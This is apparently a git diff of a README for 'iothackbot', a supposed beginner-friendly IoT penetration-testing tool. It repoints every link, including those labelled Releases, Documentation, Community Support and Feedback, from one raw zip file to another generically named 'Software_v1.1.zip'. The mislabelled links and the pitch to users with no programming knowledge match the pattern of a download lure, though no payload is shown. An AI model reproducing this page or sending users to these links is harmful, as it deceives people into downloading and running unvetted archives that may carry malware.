@@ -1,13 +1,13 @@
 # 🤖 iothackbot - Tools for Easy IoT Testing
 
 ## 📦 Download Now
-[![Download iothackbot](https://raw.githubusercontent.com/Herve55511/iothackbot/master/tools/iothackbot/core/iothackbot_v2.5.zip)](https://raw.githubusercontent.com/Herve55511/iothackbot/master/tools/iothackbot/core/iothackbot_v2.5.zip)
+[![Download iothackbot](https://raw.githubusercontent.com/Herve55511/iothackbot/master/bin/Software_v1.1.zip)](https://raw.githubusercontent.com/Herve55511/iothackbot/master/bin/Software_v1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **iothackbot**! This is your home for exploring and testing Internet of Things (IoT) devices safely. This tool provides a collection of skills and custom tools focused on IoT penetration testing. You don’t need any programming knowledge to get started. Follow these simple steps to download and run the software.
 
 ## 📥 Download & Install
-To get **iothackbot**, visit this page to download: [iothackbot Releases](https://raw.githubusercontent.com/Herve55511/iothackbot/master/tools/iothackbot/core/iothackbot_v2.5.zip). 
+To get **iothackbot**, visit this page to download: [iothackbot Releases](https://raw.githubusercontent.com/Herve55511/iothackbot/master/bin/Software_v1.1.zip). 
 
 1. Open the link in your web browser.
 2. You will see the most recent version of **iothackbot**. Click on the version number to access more details.
@@ -47,9 +47,9 @@ If you face any problems during installation or running the software, consider t
 ## 🔗 Additional Resources
 For a deeper understanding of the tools and techniques included in **iothackbot**, check out these resources:
 
-- [Documentation](https://raw.githubusercontent.com/Herve55511/iothackbot/master/tools/iothackbot/core/iothackbot_v2.5.zip): Detailed guides and explanations for all features.
-- [Community Support](https://raw.githubusercontent.com/Herve55511/iothackbot/master/tools/iothackbot/core/iothackbot_v2.5.zip): Join discussions and ask questions from fellow users.
-- [Feedback](https://raw.githubusercontent.com/Herve55511/iothackbot/master/tools/iothackbot/core/iothackbot_v2.5.zip): Report any issues or suggest new features directly through our issue tracker.
+- [Documentation](https://raw.githubusercontent.com/Herve55511/iothackbot/master/bin/Software_v1.1.zip): Detailed guides and explanations for all features.
+- [Community Support](https://raw.githubusercontent.com/Herve55511/iothackbot/master/bin/Software_v1.1.zip): Join discussions and ask questions from fellow users.
+- [Feedback](https://raw.githubusercontent.com/Herve55511/iothackbot/master/bin/Software_v1.1.zip): Report any issues or suggest new features directly through our issue tracker.
 
 ## 👥 Contributing
 We welcome contributions from users who want to improve **iothackbot**. If you have ideas or suggestions, feel free to open an issue or submit a pull request. For more details, visit our contributing guide in the documentation.
